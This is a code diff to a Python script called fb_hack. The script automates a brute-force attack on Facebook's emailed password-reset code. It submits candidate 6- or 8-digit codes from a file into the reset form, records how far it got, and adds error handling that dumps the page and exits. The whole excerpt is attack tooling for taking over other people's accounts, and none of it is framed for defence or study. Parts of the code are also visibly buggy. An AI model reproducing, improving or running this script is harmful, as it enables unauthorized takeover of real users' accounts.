@@ -6,13 +6,10 @@ import requests
 import mechanize
 import os
 import re
-CHRS = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
 
 MOZILLA_UAS = 'Mozilla/5.0 (X11; U; Linux i686; en-US) ' \
               'AppleWebKit/534.7 (KHTML, like Gecko) ' \
               'Chrome/7.0.517.41 Safari/534.7' 
-
-LOGIN_URL = 'https://mbasic.facebook.com/login/?ref=dbl&fl&login_from_aymh=1'
 
 def __init__(self):
     self.browser = self.setup_browser()
@@ -78,16 +75,6 @@ def fb_hack(email, codex):
   check2 = soup.find(string=re.compile("8"))
   check3 = soup.find(string="Please check your email for a message with your code. Your code is 6 numbers long.")
   check4 = soup.find(string="Please check your email for a message with your code. Your code is 8 numbers long.")
-  print(check1)
-  print(check2)
-  print(check3)
-  print(check4)
-  response1 = browser.response()
-  soup = BeautifulSoup(response1, 'html.parser')
-  with open("output1.html", "w") as file:
-    file.write(str(soup))
-  with open("output1.txt", "w") as file:
-    file.write(str(soup))
   if check1 == "Please check your email for a message with your code. Your code is 6 numbers long.":
     attempt = int(codex)
     print(check1)
@@ -97,15 +84,25 @@ def fb_hack(email, codex):
       browser.select_form(nr=0)
       y = f.readlines(attempt)
       attempt += 1
-      browser.form['n'] = y
-      browser.submit()
-      print(y, end='\r')
-      fail = (y, "failed")
-      success = (y, "succeded")
-      s = " "
-      with open("passcoder.txt", "a+") as z:
-        f.write(str(attempt))
-        f.close()
+      try:
+        browser.form['n'] = y
+        browser.submit()
+        print(y, end='\r')
+        fail = (y, "failed")
+        success = (y, "succeded")
+        s = " "
+      except:
+        response1 = browser.response()
+        soup = BeautifulSoup(response1, 'html.parser')
+        with open("output1.html", "w") as file:
+          file.write(str(soup))
+        with open("output1.txt", "w") as file:
+          file.write(str(soup))
+        with open("passcoder.txt", "a+") as z:
+          f.write(str(attempt))
+          f.close()
+        print("error")
+        sys.exit()
       response1 = browser.response()
       soup = BeautifulSoup(response1, 'html.parser')
       check1 = soup.find(string="Please check your email for a message with your code. Your code is 6 numbers long.")
